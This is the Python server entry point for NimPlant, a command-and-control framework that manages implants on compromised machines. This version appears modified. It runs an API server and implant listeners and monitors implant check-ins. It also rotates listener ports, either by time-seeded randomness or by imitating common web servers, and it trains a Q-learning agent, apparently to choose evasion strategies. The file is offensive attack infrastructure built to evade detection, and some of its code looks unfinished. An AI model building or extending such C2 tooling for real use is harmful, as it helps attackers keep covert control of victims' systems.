#!/usr/bin/python3

# -----
#
#   NimPlant Server - The "C2-ish"™ handler for the NimPlant payload
#   By Cas van Cooten (@chvancooten)
#
# -----

import threading
import time
import datetime
import random

from .api.server import api_server, server_ip, server_port
from .util.db import initDb, dbInitNewServer, dbPreviousServerSameConfig
from .util.func import nimplantPrint, periodicNimplantChecks
from .util.listener import *
from .util.nimplant import *
from .util.input import *
from .util.NimPlantEnv import *
from .util.QLearning import *


def main(xor_key=459457925, name=""):
    # Initialize the SQLite database
    initDb()

    # Restore the previous server session if config remains unchanged
    # Otherwise, initialize a new server session
    if dbPreviousServerSameConfig(np_server, xor_key):
        nimplantPrint("Existing server session found, restoring...")
        np_server.restoreServerFromDb()
    else:
        np_server.initNewServer(name, xor_key)
        dbInitNewServer(np_server)

    # Start daemonized Flask server for API communications
    t1 = threading.Thread(name="Listener", target=api_server)
    t1.setDaemon(True)
    t1.start()
    nimplantPrint(f"Started management server on http://{server_ip}:{server_port}.")

    t_reserve = threading.Thread(name="Listener", target=flaskListener, args=(xor_key, np_server.listenerPort))
    t_reserve.setDaemon(True)
    t_reserve.start()
    nimplantPrint(
        f"Started NimPlant reserve listener on {listenerType.lower()}://{listenerIp}:{np_server.listenerPort}. CTRL-C to cancel waiting for NimPlants."
    )
    configPort = np_server.listenerPort

    # Start another thread for NimPlant listener
    def startListener(port = listenerPort):
        try:
            t2._delete()
        except:
            pass

        t2 = threading.Thread(name="Listener", target=flaskListener, args=(xor_key, port))
        t2.setDaemon(True)
        t2.start()
        nimplantPrint(
            f"Started NimPlant listener on {listenerType.lower()}://{listenerIp}:{port}. CTRL-C to cancel waiting for NimPlants."
        )

    currentPort = listenerPort

    # Start another thread to periodically check if nimplants checked in on time
    t3 = threading.Thread(name="Listener", target=periodicNimplantChecks)
    t3.setDaemon(True)
    t3.start()

    possiblePorts = [8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087]
    list_length = len(possiblePorts)

    serverNamePortDict = {"Apache": 8080, "IIS": 8081, "Nginx": 8082, "Lighttpd": 8083, "NetWare": 8084, "GWS": 8085, "Domino": 8086, "NimPlant C2 Server": 80}

    def changeListenerPort(currentPort):
        while True:
            while(np_server.strategyThreeEnabled):
                if(np_server.strategyOneEnabled):
                    try:
                        newPort = serverNamePortDict[np_server.ident.split('/')[0]]
                    except:
                        newPort = np_server.listenerPort
                else:
                    minutes = int(datetime.datetime.now().minute//10)
                    random.seed(minutes)
                    index = random.randint(0, list_length - 1)
                    newPort = possiblePorts[index]

                if(newPort != np_server.listenerPort):
                    try:
                        np_server.listenerPort = newPort
                        startListener(newPort)
                    except:
                        pass

                time.sleep(1)
            np_server.listenerPort = configPort
            time.sleep(1)

    t4 = threading.Thread(name="PortChanger", target=changeListenerPort, args=([currentPort]))
    t4.start()

    # Run the console as the main thread
    #main "loop"
    env = NimPlantEnv()
    env.reset()
    nimplantPrint("Waiting 30 seconds for client to connect . . .")
    time.sleep(0)
    nimplantPrint("Started Q_learning")

    Q_learn_pol, Q_table = Q_learning_train(env, 0.2, 0.95, 0.1, 5) # env, alpha, gamma, epsilon, episodes